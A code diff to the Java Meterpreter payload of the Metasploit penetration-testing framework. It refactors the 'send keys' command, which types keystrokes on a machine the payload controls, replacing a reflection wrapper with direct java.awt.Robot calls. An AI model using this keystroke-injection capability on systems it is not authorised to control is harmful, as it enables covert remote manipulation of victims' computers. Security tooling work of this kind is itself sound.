@@ -5,7 +5,7 @@ import com.metasploit.meterpreter.TLVPacket;
 import com.metasploit.meterpreter.TLVType;
 import com.metasploit.meterpreter.command.Command;
 
-import java.lang.reflect.Method;
+import java.awt.Robot;
 
 public class stdapi_ui_send_keys_V1_4 extends stdapi_ui_send_keys implements Command {
 
@@ -16,7 +16,7 @@ public class stdapi_ui_send_keys_V1_4 extends stdapi_ui_send_keys implements Com
     }
 
     private void pressKeyString(String keyString) throws Exception {
-        RobotReflect robot = new RobotReflect();
+        Robot robot = new Robot();
         for (int i=0;i<keyString.length();i++) {
             int keyCode = keyString.charAt(i);
             robot.keyPress(keyCode);
@@ -39,25 +39,4 @@ public class stdapi_ui_send_keys_V1_4 extends stdapi_ui_send_keys implements Com
         r.keyRelease(KeyEvent.VK_ALT);
     }
  */
-
-    private static class RobotReflect {
-        Object robotObject;
-        Method keyPress;
-        Method keyRelease;
-
-        RobotReflect() throws Exception {
-            Class robotClass = Class.forName("java.awt.Robot");
-            robotObject = robotClass.newInstance();
-            keyPress = robotClass.getMethod("keyPress", int.class);
-            keyRelease = robotClass.getMethod("keyRelease", int.class);
-        }
-
-        void keyPress(int i) throws Exception {
-            keyPress.invoke(robotObject, i);
-        }
-
-        void keyRelease(int i) throws Exception {
-            keyRelease.invoke(robotObject, i);
-        }
-    }
 }
